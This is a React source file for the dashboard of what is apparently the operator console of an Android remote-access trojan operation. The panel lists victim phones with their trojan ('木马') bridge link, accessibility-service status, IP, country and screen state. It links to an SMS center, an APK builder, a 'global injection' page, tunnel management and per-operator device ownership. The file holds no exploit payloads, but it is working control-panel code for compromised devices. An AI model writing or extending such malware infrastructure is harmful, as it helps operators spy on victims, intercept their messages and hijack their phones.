import { useEffect, useMemo, useRef, useState } from 'react'
import { api } from '../api/client'
import DeviceActions from '../components/DeviceActions'
import AccountsPage from './AccountsPage'
import SettingsPage from './SettingsPage'
import SmsPage from './SmsPage'
import NodePage from './NodePage'
import InjPage from './InjPage'
import ApkPage from './ApkPage'
import TunnelMonitor from './TunnelMonitor'
import { androidVersion, appVersion, appName, battery, batteryLevel, country, deviceName, deviceStatus, formatTime, installTime, ip, lastHeartbeat, lastSeen, model, owner, pid, pname, pon, statusText, today } from '../utils/device'
import { toast } from '../utils/toast'

const STAT_ICONS = {
  red: '📱',
  green: '🟢',
  gray: '⚫',
  indigo: '✨',
  orange: '🔄',
}

function Stat({ c, t, v, ico }) {
  return (
    <div className={`s-card ${c}`}>
      <div className="s-card-top">
        <span className="s-ico">{ico || STAT_ICONS[c] || '◆'}</span>
        <div className="s-title">{t}</div>
      </div>
      <div className="s-val">{v}</div>
    </div>
  )
}

function BatteryIcon({ level }) {
  const pct = Math.max(0, Math.min(100, level || 0))
  const cls = pct > 60 ? 'battery-high' : pct > 20 ? 'battery-mid' : 'battery-low'
  return (
    <span className={cls}>
      <span className="battery-indicator">
        <span className="battery-icon">
          <span className="battery-fill" style={{ width: `${pct}%` }} />
        </span>
        <span className="battery-text">{pct}%</span>
      </span>
    </span>
  )
}

function PhoneIcon({ status, screenOn }) {
  const online = status === 'online'
  const sleeping = status === 'sleeping' || status === 'connecting'
  // 离线设备强制息屏；在线/休眠设备才读取实际屏幕状态
  const isScreenOn = (!online && !sleeping) ? false : (screenOn !== undefined ? screenOn : online)
  
  // 亮屏：屏幕明亮发光；息屏：屏幕暗淡
  const screenColor = isScreenOn ? '#10b981' : '#1a1a2a'
  const screenOpacity = isScreenOn ? 0.85 : 0.4
  const frameColor = online ? '#1a1a2e' : sleeping ? '#2a2a1e' : '#2a2a2a'
  const strokeColor = online ? '#22c55e' : sleeping ? '#f59e0b' : '#555'
  const title = `${online ? '在线' : sleeping ? '休眠' : '离线'} · ${isScreenOn ? '亮屏' : '息屏'}`
  
  return (
    <div className={`dc-phone-icon${sleeping ? ' connecting' : ''}`} title={title}>
      <svg width="64" height="104" viewBox="0 0 32 52">
        {/* 手机外壳 */}
        <rect x="2" y="1" width="28" height="50" rx="5" ry="5" fill={frameColor} stroke={strokeColor} strokeWidth="1" />
        {/* 屏幕 - 亮屏时有渐变发光效果 */}
        <rect x="4" y="6" width="24" height="38" rx="1" fill={screenColor} opacity={screenOpacity} />
        {isScreenOn && (
          <>
            <rect x="4" y="6" width="24" height="38" rx="1" fill="url(#screenGlow)" opacity="0.3" />
            <defs><linearGradient id="screenGlow" x1="0" y1="0" x2="0" y2="1"><stop offset="0%" stopColor="#fff" /><stop offset="100%" stopColor="transparent" /></linearGradient></defs>
          </>
        )}
        {/* 息屏时显示月亮图标 */}
        {!isScreenOn && <text x="16" y="28" textAnchor="middle" fill="#555" fontSize="8">🌙</text>}
        {/* 休眠动画 */}
        {sleeping && isScreenOn && <text x="16" y="28" textAnchor="middle" fill="#fff" fontSize="6" opacity="0.8">💤</text>}
        {/* Home键 */}
        <circle cx="16" cy="48" r="2" fill="#555" />
        {/* 亮屏指示灯 */}
        <circle cx="16" cy="3.5" r="1" fill={isScreenOn ? '#22c55e' : '#333'} opacity={isScreenOn ? 1 : 0.5} />
      </svg>
    </div>
  )
}

function RemarkCell({ device, onEditRemark }) {
  const remark = device.remark || ''
  return (
    <span className="remark-cell" style={{color:"#fbbf24"}} onClick={() => onEditRemark(device)} title="点击编辑备注">
      {remark ? <span className="remark-text" style={{color:"#fbbf24"}}>{remark}</span> : <span className="remark-empty" style={{color:"#6b5080"}}>📝 添加备注</span>}
    </span>
  )
}

function CardView({ devices, refresh, highlightedDeviceId, onEditRemark }) {
  return (
    <div className="device-cards">
      {devices.map((d) => {
        const st = deviceStatus(d)
        return (
        <div key={pid(d)} className={`device-card ${st} ${highlightedDeviceId === pid(d) ? 'sel' : ''}`}>
          <div className="dc-header">
            <div className="dc-header-left">
              <span className={`pill ${deviceStatus(d)}`}>{statusText(deviceStatus(d))}</span>
              <span className="dc-id" title={pid(d)}>{pid(d)}</span>
            </div>
            <div className="dc-actions-wrap">
              <DeviceActions device={d} refresh={refresh} />
            </div>
          </div>
          <div className="dc-body-with-phone">
            <div className="dc-phone-col">
              <PhoneIcon status={deviceStatus(d)} screenOn={d.isScreenOn ?? d.is_screen_on} />
              <div className="dc-status-pills">
                <span className={`dc-spill ${d.ws_connected ? 'on' : 'off'}`} title="WS连接"><em>🔌 WS</em><b>{d.ws_connected ? '✓' : '✗'}</b></span>
                <span className={`dc-spill ${d.bridge_connected ? 'on' : 'off'}`} title="木马(Bridge)"><em>🔗 木马</em><b>{d.bridge_connected ? '✓' : '✗'}</b></span>
                <span className={`dc-spill ${d.accessibilityAlive ?? d.accessibility_alive ? 'on' : 'off'}`} title="无障碍服务"><em>♿ 无障碍</em><b>{(d.accessibilityAlive ?? d.accessibility_alive) ? '✓' : '✗'}</b></span>
                <span className={`dc-spill ${d.networkType && d.networkType.toLowerCase().includes('wifi') ? 'on' : 'off'}`} title="网络"><em>📶 网络</em><b>{d.networkType || '-'}</b></span>
              </div>
            </div>
            <div className="dc-body">
              <div className="dc-row"><span className="dc-label">设备名称</span><span>{deviceName(d)}</span></div>
              <div className="dc-row"><span className="dc-label">型号</span><span>{model(d)}</span></div>
              <div className="dc-row"><span className="dc-label">IP</span><span>{ip(d)}</span></div>
              <div className="dc-row"><span className="dc-label">电量</span><BatteryIcon level={batteryLevel(d)} /></div>
              <div className="dc-row"><span className="dc-label">系统</span><span>{androidVersion(d)}</span></div>
              <div className="dc-row"><span className="dc-label">版本</span><span>{appVersion(d)}</span></div>
              <div className="dc-row"><span className="dc-label">国家</span><span>{country(d)}</span></div>
              <div className="dc-row"><span className="dc-label">安装时间</span><span>{installTime(d)}</span></div>
              <div className="dc-row"><span className="dc-label">最后心跳</span><span>{lastHeartbeat(d)}</span></div>
              <div className="dc-row"><span className="dc-label">归属</span><span className="owner-text" style={{color:"#a855f7"}}>{owner(d) || '-'}</span></div>
              <div className="dc-row"><span className="dc-label">备注</span><RemarkCell device={d} onEditRemark={onEditRemark} /></div>
            </div>
          </div>
        </div>
        )
      })}
    </div>
  )
}

function ListView({ list, refresh, selected, setSelected, highlightedDeviceId, onEditRemark }) {
  const all = list.length > 0 && selected.size === list.length

  return (
    <div className="device-list-rows">
      <div className="dlr-select-bar">
        <label className="dlr-check-all">
          <input type="checkbox" checked={all} onChange={() => { if (all) setSelected(new Set()); else setSelected(new Set(list.map((d) => pid(d)))) }} />
          <span>全选 ({list.length})</span>
        </label>
      </div>
      {list.map((d) => {
        const st = deviceStatus(d)
        const isSelected = selected.has(pid(d)) || highlightedDeviceId === pid(d)
        // 离线设备强制息屏
        const screenOn = st === 'offline' ? false : (d.isScreenOn ?? d.is_screen_on ?? false)
        const isWifi = d.networkType && d.networkType.toLowerCase().includes('wifi')
        return (
          <div key={pid(d)} className={`dlr-item ${isSelected ? 'sel' : ''} ${st}`}>
            <div className="dlr-check">
              <input type="checkbox" checked={selected.has(pid(d))} onChange={() => { const next = new Set(selected); if (next.has(pid(d))) next.delete(pid(d)); else next.add(pid(d)); setSelected(next) }} />
            </div>
            {/* 在线状态药丸 */}
            <div className="dlr-status-pill">
              <span className={`pill ${st}`}>{statusText(st)}</span>
            </div>
            {/* 屏幕状态 */}
            <div className="dlr-screen" title={screenOn ? '亮屏' : '息屏'}>
              {screenOn ? '🔆' : '🌙'}
            </div>
            {/* 设备信息 */}
            <div className="dlr-info">
              <div className="dlr-primary">
                <span className="dlr-name">{pname(d) || deviceName(d) || model(d)}</span>
                <span className="dlr-id">{pid(d).slice(0, 12)}</span>
              </div>
              <div className="dlr-meta">
                <span className="dlr-meta-model" title="型号">📱 {model(d)}</span>
                <span title="IP">🌐 {ip(d)}</span>
                <span title="系统">🤖 {androidVersion(d)}</span>
                <span title="最后心跳">⏱ {formatTime(lastSeen(d))}</span>
                {owner(d) && <span className="dlr-owner" title="归属" style={{color:"#a855f7"}}>👤 {owner(d)}</span>}
                <RemarkCell device={d} onEditRemark={onEditRemark} />
              </div>
            </div>
            {/* 电量图标 */}
            <div className="dlr-battery">
              <BatteryIcon level={batteryLevel(d)} />
            </div>
            {/* WiFi/网络 */}
            <div className={`dlr-wifi ${isWifi ? 'on' : ''}`} title={d.networkType || '未知'}>
              📶 <span className="dlr-wifi-text">{d.networkType || '-'}</span>
            </div>
            {/* 连接状态药丸 */}
            <div className="dlr-conn">
              <span className={`dc-spill ${d.ws_connected ? 'on' : 'off'}`} title="WS连接"><em>🔌</em><b>{d.ws_connected ? '✓' : '✗'}</b></span>
              <span className={`dc-spill ${d.bridge_connected ? 'on' : 'off'}`} title="木马(Bridge)"><em>🔗</em><b>{d.bridge_connected ? '✓' : '✗'}</b></span>
              <span className={`dc-spill ${d.accessibilityAlive ?? d.accessibility_alive ? 'on' : 'off'}`} title="无障碍服务"><em>♿</em><b>{(d.accessibilityAlive ?? d.accessibility_alive) ? '✓' : '✗'}</b></span>
            </div>
            {/* 操作 */}
            <div className="dlr-actions">
              <DeviceActions device={d} refresh={refresh} compact />
            </div>
          </div>
        )
      })}
    </div>
  )
}

function AbPackPage() {
  return (
    <section className="panel placeholder-panel">
      <div className="placeholder-icon">🛡️</div>
      <div>双包构建 - 待完善</div>
    </section>
  )
}

function Err({ msg }) {
  return <div className="toast err" style={{ margin: 16 }}>{msg || '加载失败'}</div>
}

const TAB_LABELS = {
  sms: '短信中心',
  apk: '单包构建',
  abpack: '双包构建',
  settings: '系统设置',
  injection: '全局注入',
  server: '节点状态',
  accounts: '账号管理',
}

const TZ_GROUPS = [
  {
    continent: '亚洲 Asia',
    zones: [
      { v: 'Asia/Shanghai', l: '🇨🇳 中国 / 北京时间' },
      { v: 'Asia/Hong_Kong', l: '🇭🇰 香港' },
      { v: 'Asia/Taipei', l: '🇹🇼 台湾 / 台北' },
      { v: 'Asia/Tokyo', l: '🇯🇵 日本 / 东京' },
      { v: 'Asia/Seoul', l: '🇰🇷 韩国 / 首尔' },
      { v: 'Asia/Singapore', l: '🇸🇬 新加坡' },
      { v: 'Asia/Bangkok', l: '🇹🇭 泰国 / 曼谷' },
      { v: 'Asia/Kolkata', l: '🇮🇳 印度 / 新德里' },
      { v: 'Asia/Dubai', l: '🇦🇪 阿联酋 / 迪拜' },
    ],
  },
  {
    continent: '欧洲 Europe',
    zones: [
      { v: 'Europe/London', l: '🇬🇧 英国 / 伦敦' },
      { v: 'Europe/Paris', l: '🇫🇷 法国 / 巴黎' },
      { v: 'Europe/Berlin', l: '🇩🇪 德国 / 柏林' },
      { v: 'Europe/Madrid', l: '🇪🇸 西班牙 / 马德里' },
      { v: 'Europe/Rome', l: '🇮🇹 意大利 / 罗马' },
      { v: 'Europe/Moscow', l: '🇷🇺 俄罗斯 / 莫斯科' },
    ],
  },
  {
    continent: '北美洲 North America',
    zones: [
      { v: 'America/New_York', l: '🇺🇸 美国 / 纽约' },
      { v: 'America/Chicago', l: '🇺🇸 美国 / 芝加哥' },
      { v: 'America/Denver', l: '🇺🇸 美国 / 丹佛' },
      { v: 'America/Los_Angeles', l: '🇺🇸 美国 / 洛杉矶' },
      { v: 'America/Toronto', l: '🇨🇦 加拿大 / 多伦多' },
      { v: 'America/Vancouver', l: '🇨🇦 加拿大 / 温哥华' },
      { v: 'America/Mexico_City', l: '🇲🇽 墨西哥 / 墨西哥城' },
    ],
  },
  {
    continent: '南美洲 South America',
    zones: [
      { v: 'America/Sao_Paulo', l: '🇧🇷 巴西 / 圣保罗' },
      { v: 'America/Argentina/Buenos_Aires', l: '🇦🇷 阿根廷 / 布宜诺斯艾利斯' },
      { v: 'America/Santiago', l: '🇨🇱 智利 / 圣地亚哥' },
      { v: 'America/Bogota', l: '🇨🇴 哥伦比亚 / 波哥大' },
    ],
  },
  {
    continent: '大洋洲 Oceania',
    zones: [
      { v: 'Australia/Sydney', l: '🇦🇺 澳大利亚 / 悉尼' },
      { v: 'Australia/Melbourne', l: '🇦🇺 澳大利亚 / 墨尔本' },
      { v: 'Pacific/Auckland', l: '🇳🇿 新西兰 / 奥克兰' },
    ],
  },
  {
    continent: '非洲 Africa',
    zones: [
      { v: 'Africa/Cairo', l: '🇪🇬 埃及 / 开罗' },
      { v: 'Africa/Johannesburg', l: '🇿🇦 南非 / 约翰内斯堡' },
      { v: 'Africa/Lagos', l: '🇳🇬 尼日利亚 / 拉各斯' },
      { v: 'Africa/Nairobi', l: '🇰🇪 肯尼亚 / 内罗毕' },
    ],
  },
]

export default function Dashboard({ user, onLogout }) {
  const [now, setNow] = useState(new Date())
  const [isLight, setIsLight] = useState(() => {
    const saved = localStorage.getItem('fc_theme')
    // 默认 dark（夜间护眼）；仅当用户明确选 light 才进白天
    const light = saved === 'light'
    document.documentElement.setAttribute('data-theme', light ? 'light' : 'dark')
    document.documentElement.classList.toggle('dark', !light)
    return light
  })
  const [tz, setTz] = useState(localStorage.getItem('fc_timezone') || 'Asia/Shanghai')
  const [tab, setTab] = useState('overview')
  const [devices, setDevices] = useState([])
  const [err, setErr] = useState('')
  const [q, setQ] = useState('')
  // ★ 2026-08-06：在线状态多选（空 Set = 不过滤，3 个状态 = online/sleeping/offline）
  const [flt, setFlt] = useState(new Set())  // multi-select status: Set<'online'|'sleeping'|'offline'>
  const [connFlt, setConnFlt] = useState('all')
  const [ownerFlt, setOwnerFlt] = useState('all')  // 归属用户筛选
  const [view, setView] = useState('card')
  const [selected, setSelected] = useState(new Set())
  const [remarkDevice, setRemarkDevice] = useState(null)
  const [remarkValue, setRemarkValue] = useState('')
  const [remarkSaving, setRemarkSaving] = useState(false)
  const highlightedDeviceRef = useRef('')

  useEffect(() => {
    const timer = setInterval(() => setNow(new Date()), 1000)
    return () => clearInterval(timer)
  }, [])

  useEffect(() => {
    const light = localStorage.getItem('fc_theme') === 'light'
    setIsLight(light)
    document.documentElement.setAttribute('data-theme', light ? 'light' : '')
    document.documentElement.classList.toggle('dark', !light)
  }, [])

  const list = useMemo(() => devices.filter((d) => {
    const matchSearch = JSON.stringify(d).toLowerCase().includes(q.toLowerCase())
    const status = deviceStatus(d)
    // ★ 2026-08-06：在线状态多选（空 Set = 不过滤，否则只要交集）
    const matchFilter = flt.size === 0 || flt.has(status)
    const matchConn = connFlt === 'all' || (connFlt === 'ws' && d.ws_connected) || (connFlt === 'bridge' && d.bridge_connected)
    if (!matchConn) return false
    // ★ 2026-08-06：归属用户筛选（owner_username）
    const owner = d.ownerUsername ?? d.owner_username ?? ''
    const matchOwner = ownerFlt === 'all' || owner === ownerFlt
    if (!matchOwner) return false
    return matchSearch && matchFilter
  }).sort((a,b)=>{const ta=a.firstInstallTime||a.first_seen||a.created_at||0;const tb=b.firstInstallTime||b.first_seen||b.created_at||0;return tb-ta}), [devices, q, flt, connFlt, ownerFlt])

  async function refresh() {
    setErr('')
    try {
      const r = await api.devices()
      setDevices(r.data?.devices || r.devices || r.data || [])
    } catch (e) {
      setErr(e.message)
    }
  }

  useEffect(() => {
    const params = new URLSearchParams(window.location.search)
    const initialTab = params.get('tab')
    const deviceId = params.get('deviceId')
    if (initialTab) setTab(initialTab)
    if (deviceId) {
      highlightedDeviceRef.current = deviceId
      setQ(deviceId)
    }
    refresh()
    window.__refreshDevices = refresh
    // 5秒自动刷新
    const autoRefresh = setInterval(refresh, 5000)
    return () => { delete window.__refreshDevices; clearInterval(autoRefresh) }
  }, [])

  function fmtTime(date, timeZone) {
    try {
      return date.toLocaleString('zh-CN', { timeZone, timeStyle: 'medium', hourCycle: 'h23' })
    } catch {
      return date.toLocaleTimeString()
    }
  }

  function toggleTheme(on) {
    setIsLight(on)
    document.documentElement.setAttribute('data-theme', on ? 'light' : '')
    document.documentElement.classList.toggle('dark', !on)
    localStorage.setItem('fc_theme', on ? 'light' : '')
  }

  async function handleRemarkSave() {
    if (!remarkDevice) return
    setRemarkSaving(true)
    try {
      await api.updateRemark(pid(remarkDevice), remarkValue)
      toast('备注已更新')
      setRemarkDevice(null)
      refresh()
    } catch (e) {
      toast('备注更新失败: ' + e.message)
    } finally {
      setRemarkSaving(false)
    }
  }

  const userRole = user?.role || 'user'
  const isSuperAdmin = userRole === 'superadmin' || userRole === 'super-admin'
  const userPerms = user?.permissions || null
  const hasPerm = (key) => isSuperAdmin || !userPerms || (Array.isArray(userPerms) && userPerms.includes(key))
  const onlineCount = devices.filter(pon).length
  const connectingCount = devices.filter((d) => deviceStatus(d) === 'sleeping').length

  return (
    <div className="dashboard-root">
      <div className="dashboard-topbar">
        <div className="topbar-left">
          <span className="topbar-brand-dot" />
          <span className="topbar-flag">🇨🇳</span>
          <span className="topbar-muted">中国时间</span>
          <span className="topbar-clock">{fmtTime(now, 'Asia/Shanghai')}</span>
        </div>
        <div className="topbar-right">
          <span className="topbar-user">👤 {user?.username || '未知'}</span>
          <span className="topbar-sep">|</span>
          <span className="topbar-online">🟢 在线: <b>{onlineCount}</b></span>
          <span className="topbar-sep">|</span>
          <select
            className="topbar-tz"
            value={tz}
            onChange={(e) => {
              setTz(e.target.value)
              localStorage.setItem('fc_timezone', e.target.value)
            }}
          >
            {TZ_GROUPS.map((group) => (
              <optgroup key={group.continent} label={group.continent}>
                {group.zones.map((item) => <option key={item.v} value={item.v}>{item.l}</option>)}
              </optgroup>
            ))}
          </select>
          <span className="topbar-clock">{fmtTime(now, tz)}</span>
          <label className="theme-toggle">
            <input type="checkbox" checked={isLight} onChange={(e) => toggleTheme(e.target.checked)} />
            <span className="theme-track">
              <span>🌙</span>
              <span>☀️</span>
              <span className={`theme-thumb ${isLight ? 'on' : ''}`} />
            </span>
          </label>
        </div>
      </div>

      <div className="rc-shell">
        <aside className="rc-sidebar">
          <div className="rc-brand">
            <img src="/hdkj.png" alt="黑洞科技" style={{width:'36px',height:'36px',borderRadius:'8px'}}/>
            <div>
              <div className="rc-logo">黑洞科技</div>
              <div className="rc-sub">设备管理后台</div>
            </div>
          </div>
          <nav>
            {hasPerm('control') && <button type="button" className={tab === 'overview' ? 'on' : ''} onClick={() => setTab('overview')}>🎮 终端控制</button>}
            {hasPerm('sms') && <button type="button" className={tab === 'sms' ? 'on' : ''} onClick={() => setTab('sms')}>💬 短信中心</button>}
            {hasPerm('apk') && <button type="button" className={tab === 'apk' ? 'on' : ''} onClick={() => setTab('apk')}>📦 单包构建</button>}
            {hasPerm('settings') && <button type="button" className={tab === 'settings' ? 'on' : ''} onClick={() => setTab('settings')}>⚙️ 系统设置</button>}
            {hasPerm('injection') && <button type="button" className={tab === 'injection' ? 'on' : ''} onClick={() => setTab('injection')}>💉 全局注入</button>}
            {hasPerm('node') && <button type="button" className={tab === 'server' ? 'on' : ''} onClick={() => setTab('server')}>🌐 节点状态</button>}
            {isSuperAdmin && <button type="button" className={tab === 'tunnel' ? 'on' : ''} onClick={() => setTab('tunnel')}>🛣️ 隧道管理</button>}
            {hasPerm('accounts') && <button type="button" className={tab === 'accounts' ? 'on' : ''} onClick={() => setTab('accounts')}>👥 账号管理</button>}
            <button type="button" onClick={onLogout}>🚪 退出登录</button>
          </nav>
        </aside>

        <main className="rc-main">
          {tab === 'overview' ? (
            <>
              <section className="dashboard-hero">
                <div>
                  <div className="hero-kicker">CONTROL CENTER</div>
                  <h1>🎮 终端控制</h1>
                </div>
              </section>
              {err && <Err msg={err} />}
              <section className="rc-stats">
                <Stat c="red" t="总设备数" v={devices.length} />
                <Stat c="green" t="在线设备" v={onlineCount} />
                <Stat c="gray" t="离线设备" v={Math.max(devices.length - onlineCount, 0)} />
                <Stat c="indigo" t="今日新增" v={devices.filter(today).length} />
                <Stat c="orange" t="休眠" v={connectingCount} />
                <Stat c="green" ico="🔌" t="WS在线" v={devices.filter(d => d.ws_connected).length} />
                <Stat c="indigo" ico="🔗" t="木马" v={devices.filter(d => d.bridge_connected).length} />
                <Stat c="violet" ico="♿" t="无障碍" v={devices.filter(d => d.accessibilityAlive ?? d.accessibility_alive).length} />
              </section>

              <div className="rc-topbar rc-device-toolbar">
                <div className="rc-top-left">
                  <span>📱 设备总数 <b>{devices.length}</b></span>
                  <div className="rc-search">
                    <input placeholder="搜索 ID / 机型 / IP" value={q} onChange={(e) => setQ(e.target.value)} />
                    <span>🔍</span>
                  </div>
                  {selected.size > 0 && <span className="sel-badge">已选 <b>{selected.size}</b> 台</span>}
                </div>
                <div className="rc-top-right">
                  {/* ★ 2026-08-06：在线状态多选 chip（点击切换） */}
                  <div style={{display: 'inline-flex', gap: 4, marginLeft: 4, alignItems: 'center'}}>
                    {[
                      { key: 'online',   label: '🟢 在线', color: '#22c55e' },
                      { key: 'sleeping', label: '🟡 休眠', color: '#f59e0b' },
                      { key: 'offline',  label: '⚫ 离线', color: '#6b7280' },
                    ].map(chip => {
                      const active = flt.has(chip.key)
                      return (
                        <button
                          key={chip.key}
                          type="button"
                          onClick={() => {
                            setFlt(prev => {
                              const next = new Set(prev)
                              if (next.has(chip.key)) next.delete(chip.key)
                              else next.add(chip.key)
                              return next
                            })
                          }}
                          style={{
                            padding: '4px 10px',
                            fontSize: 12,
                            border: '1px solid ' + (active ? chip.color : 'rgba(255,255,255,.15)'),
                            borderRadius: 4,
                            background: active ? chip.color : 'rgba(255,255,255,.04)',
                            color: active ? '#fff' : '#aaa',
                            cursor: 'pointer',
                            fontWeight: active ? 600 : 400,
                          }}
                        >{chip.label}{active ? ' ✕' : ''}</button>
                      )
                    })}
                  </div>
                  <select value={connFlt} onChange={(e) => setConnFlt(e.target.value)} style={{marginLeft: 4}}>
                    <option value="all">全部连接</option>
                    <option value="ws">🔌 WS</option>
                    <option value="bridge">🔗 木马</option>
                  </select>
                  {/* ★ 2026-08-06：归属用户筛选下拉框 */}
                  <select value={ownerFlt} onChange={(e) => setOwnerFlt(e.target.value)} style={{marginLeft: 4}}>
                    <option value="all">全部归属</option>
                    {Array.from(new Set(devices.map(d => d.ownerUsername ?? d.owner_username ?? '').filter(Boolean))).sort().map(o => (
                      <option key={o} value={o}>👤 {o}</option>
                    ))}
                  </select>
                  <div className="view-toggle">
                    <button type="button" className={`v-btn ${view === 'list' ? 'on' : ''}`} onClick={() => setView('list')}>📋</button>
                    <button type="button" className={`v-btn ${view === 'card' ? 'on' : ''}`} onClick={() => setView('card')}>🃏</button>
                  </div>
                  <button type="button" className="rc-btn" onClick={refresh}>⟳ 刷新</button>
                </div>
              </div>

              {selected.size > 0 && (
                <div className="batch-bar">
                  已选 {selected.size} 台设备
                  <button type="button" className="rc-btn" onClick={() => { toast(`批量操作执行于 ${selected.size} 台设备`); setSelected(new Set()) }}>批量执行</button>
                  <button type="button" className="rc-btn danger" onClick={() => setSelected(new Set())}>取消选择</button>
                </div>
              )}

              {view === 'card'
                ? <CardView devices={list} refresh={refresh} highlightedDeviceId={highlightedDeviceRef.current} onEditRemark={(d) => { setRemarkDevice(d); setRemarkValue(d.remark || '') }} />
                : <ListView list={list} refresh={refresh} selected={selected} setSelected={setSelected} highlightedDeviceId={highlightedDeviceRef.current} onEditRemark={(d) => { setRemarkDevice(d); setRemarkValue(d.remark || '') }} />}
            </>
          ) : (
            <>
              <header className="rc-header rc-header-elevated">{TAB_LABELS[tab] || tab}</header>
              {tab === 'accounts' && <AccountsPage />}
              {tab === 'sms' && <SmsPage />}
              {tab === 'settings' && <SettingsPage />}
              {tab === 'apk' && <ApkPage />}
              {tab === 'injection' && <InjPage />}
              {tab === 'abpack' && <AbPackPage />}
              {tab === 'server' && <NodePage />}
              {tab === 'tunnel' && (isSuperAdmin ? <TunnelMonitor /> : <div style={{ padding: 40, textAlign: 'center', color: '#ff4d4f' }}>⛔ 需要 superadmin 权限才能访问隧道管理</div>)}
            </>
          )}
        </main>
      </div>

      {remarkDevice !== null && (
        <div className="modal-overlay" onClick={() => setRemarkDevice(null)} onKeyDown={(e) => { if (e.key === 'Escape') setRemarkDevice(null) }}>
          <div className="modal-box" onClick={(e) => e.stopPropagation()}>
            <div className="modal-title">编辑备注</div>
            <div className="modal-grid">
              <div className="modal-field">
                <span className="modal-label">设备</span>
                <span className="modal-code">{deviceName(remarkDevice) || pid(remarkDevice)}</span>
              </div>
              <div className="modal-field">
                <span className="modal-label">备注内容</span>
                <textarea
                  className="remark-textarea"
                  value={remarkValue}
                  onChange={(e) => setRemarkValue(e.target.value)}
                  onKeyDown={(e) => { if (e.key === 'Escape') setRemarkDevice(null); if (e.key === 'Enter' && e.ctrlKey) handleRemarkSave() }}
                  placeholder="输入备注内容..."
                  rows={4}
                  autoFocus
                />
              </div>
            </div>
            <div className="modal-actions">
              <button className="modal-btn ghost" onClick={() => setRemarkDevice(null)}>取消</button>
              <button className="modal-btn primary" onClick={handleRemarkSave} disabled={remarkSaving}>
                {remarkSaving ? '保存中...' : '保存'}
              </button>
            </div>
          </div>
        </div>
      )}
    </div>
  )
}
